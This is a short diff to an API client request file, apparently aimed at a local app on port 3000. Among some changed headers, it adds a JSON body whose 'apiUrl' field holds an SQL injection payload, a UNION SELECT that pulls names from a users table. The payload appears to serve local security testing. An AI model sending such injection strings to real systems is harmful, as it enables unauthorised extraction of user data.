@@ -10,12 +10,15 @@ http:
     - name: Origin
       value: http://localhost:3000
     - name: X-Request-Id
-      value: e15436-e353-64d3-a716-446655440000
+      value: e16-e322-122d3-a2-446640000
     - name: X-Request-Time
-      value: 2026-08-08T14:56:16.000Z
+      value: 2026-08-22T08:05:16.000Z
   body:
     type: json
-    data: ""
+    data: |-
+      {
+      "apiUrl" : "' ) UNION SELECT DISTINCT ROW_NUMBER() OVER(), name, null, null, null FROM users #"
+      }
   auth: inherit
 
 settings:
@@ -23,3 +26,4 @@ settings:
   timeout: 0
   followRedirects: true
   maxRedirects: 5
+  forwardAuthorizationHeader: true
